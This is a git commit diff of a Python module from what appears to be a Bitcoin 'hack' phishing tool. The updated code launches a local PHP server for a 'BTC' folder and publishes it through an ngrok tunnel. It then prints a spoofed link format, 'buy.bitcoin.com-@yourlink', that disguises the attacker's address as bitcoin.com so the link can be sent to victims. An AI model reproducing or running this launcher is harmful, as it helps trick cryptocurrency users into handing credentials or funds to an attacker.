89c307c8ecc4d42930713154b00981c8beedba94
Mobin-Dan <68151748+Mobin-Dan@users.noreply.github.com>
2021-01-11 12:53:36 +0330

    Update module3.py

--- module3.py
+++ module3.py
@@ -1,11 +1,15 @@
 import os
-import pyfiglet
 from colorama import Fore
+import pyfiglet
+from pyngrok import ngrok
+from subprocess import Popen
 print(Fore.GREEN)
 os.system("clear")
-ins =pyfiglet.figlet_format("Btc hacking", font="3-d")
+ins =pyfiglet.figlet_format("BTC hack", font="3-d")
 print(Fore.RED+ins)
-print
-print(Fore.GREEN)
-print("Goodbye until the next update:)")
-os.system("php -S localhost:8090 -t BTC")
+with open("server","w") as phplog:
+    Popen(("php","-S","localhost:4040","-t","BTC"),stderr=phplog ,stdout=phplog)
+link=ngrok.connect(4040,"http")
+print(link)
+print(Fore.GREEN+" youcan send link :https://buy.bitcoin.com-@yourlink")
+input("")
